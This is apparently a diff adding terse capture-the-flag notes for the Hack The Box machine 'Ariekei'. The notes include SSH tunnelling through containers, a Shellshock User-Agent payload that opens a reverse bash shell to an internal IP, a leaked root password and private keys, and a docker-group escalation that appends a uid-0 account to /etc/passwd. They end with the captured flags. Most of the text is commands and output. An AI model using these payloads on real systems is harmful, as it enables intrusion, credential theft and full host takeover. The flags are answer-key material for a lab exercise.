@@ -211,3 +211,94 @@ jFhkdTVmzkkP62Yxd+DZ8RN+jOEs+cigpPjlhjeFJ+iN7mCZoA7UW/NeAR1GbjOe
 BJBoz1pQBtLPQSGPaw+x7rHwgRMAj/LMLTI46fMFAWXB2AzaHHDNPg==
 -----END RSA PRIVATE KEY-----
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDwzZ8tXRyG6en6U8d4r/oL/fpx2Aw+V22u8dJjNnSP9jly+RFJk8Z+aKMFTIYJ+orjyMxieqMtyYdVOUDvCanMnChmPbIWqw6UzdV+nnBrWTE/4keDSRn8ijs10tPPiBDDDpqQf21XiiyUfD0RkAl3gJk6hw7wHfWEilR1KWflbNAlau+lfM9YOFLbYrFmpKnZivqkDtuEPfnIVDurS2CiDC+oS+fnP2nGcIMec95iiPpJ4MhPvbdlb+UCxV6FoNtehT9ciZukD0xIXakwAwGlPlFQbzQqqEjEh5ltvnaJG6QzPfLnB6Uis8ku0NNDitreBm2Ba9sJ8NpXh46Ighhh root@arieka
+
+ssh -i key/bas_key  root@10.10.10.65 -p 1022
+
+### remote in the erza  host
+
+eth0  inet addr:172.23.0.253  Bcast:0.0.0.0  Mask:255.255.255.0
+eth1    net addr:172.24.0.253  Bcast:0.0.0.0  Mask:255.255.255.0
+
+-R  0.0.0.0:8000:127.0.0.1:9000
+
+~C
+
+-L             7080:172.24.0.2:80
+
+nc -lvnp 9000
+
+### shellsock  in the  beehive.ariekei.htb
+
+curl -A '() {:;} echo; /bin/bash -i >& /dev/tcp/172.24.0.253/8000 0>&1'
+
+www-data@beehive:/common/containers/bastion-live$
+
+```bash
+root@ezra:/common/containers/bastion-live# cat Dockerfile
+FROM rastasheep/ubuntu-sshd
+RUN echo "root:Ib3!kTEvYw6*P7s" | chpasswd
+RUN mkdir -p /root/.ssh
+RUN echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDwzZ8tXRyG6en6U8d4r/oL/fpx2Aw+V22u8dJjNnSP9jly+RFJk8Z+aKMFTIYJ+orjyMxieqMtyYdVOUDvCanMnChmPbIWqw6UzdV+nnBrWTE/4keDSRn8ijs10tPPiBDDDpqQf21XiiyUfD0RkAl3gJk6hw7wHfWEilR1KWflbNAlau+lfM9YOFLbYrFmpKnZivqkDtuEPfnIVDurS2CiDC+oS+fnP2nGcIMec95iiPpJ4MhPvbdlb+UCxV6FoNtehT9ciZukD0xIXakwAwGlPlFQbzQqqEjEh5ltvnaJG6QzPfLnB6Uis8ku0NNDitreBm2Ba9sJ8NpXh46Ighhh root@arieka" > /root/.ssh/authorized_keys
+www-data@beehive:/common/containers/bastion-live$
+www-data@beehive:/common/containers/bastion-live$
+
+www-data@beehive:/common/containers/bastion-live$ su
+su
+Password: Ib3!kTEvYw6*P7s
+cd .ssh
+root@beehive:/home/spanishdancer/.ssh# ls
+ls
+authorized_keys  id_rsa  id_rsa.pub
+
+./sshng2john.py  id_rsa  > spanishdancer.john
+
+openssl rsa  -in id_rsa -out spanishdancer.key
+Enter pass phrase for spanishdancer:
+writing RSA key
+```
+
+### enter 10.10.10.65
+
+ ssh -i spanishdancer.key  spanishdancer@10.10.10.65
+
+Last login: Mon Nov 13 10:23:41 2017 from 10.10.14.2
+spanishdancer@ariekei:~$
+
+uid=1000(spanishdancer) gid=1000(spanishdancer) groups=1000(spanishdancer),999(docker)
+
+!!! **docker**!!!  
+
+https://medium.com/@msuixo/linux-users-running-docker-without-sudo-is-dangerous-3e5c5654abea
+
+**TL;DR:** unless you are using a docker-machine (default on OSX and Windows), **running docker commands equals being root on the host**. If you added yourself in the docker group or changed the permission of the Docker socket, you (or a malicious program) **can become root without needing the password**.
+
+
+
+spanishdancer@ariekei:~$ docker run -v /:/mnt  -i -t bash bash
+bash-4.4# cd /mnt
+bash-4.4# ls
+bin         home        lost+found  proc        snap        usr
+boot        initrd.img  media       root        srv         var
+dev         lib         mnt         run         sys         vmlinuz
+etc         lib64       opt         sbin        tmp
+bash-4.4# cat etc/passwd
+
+payload 1
+
+/mnt/etc
+bash-4.4# echo 'he:GQd/hybD7rjG6:0:0:root:/root:/bin/bash' >> passwd
+
+root@ariekei:/home/spanishdancer# cat user.txt
+ff0bca827a5f660f6d35df7481e5f216
+root@ariekei:/home/spanishdancer# cd /root
+root@ariekei:~# ls
+root.txt
+root@ariekei:~# cat root.txt
+0385b6629b30f8a673f7bb279fb1570b
+
+
+
+payload2 
+
+cp /home/spanishdancer/.ssh/authorized_keys  /root/.ssh/
+
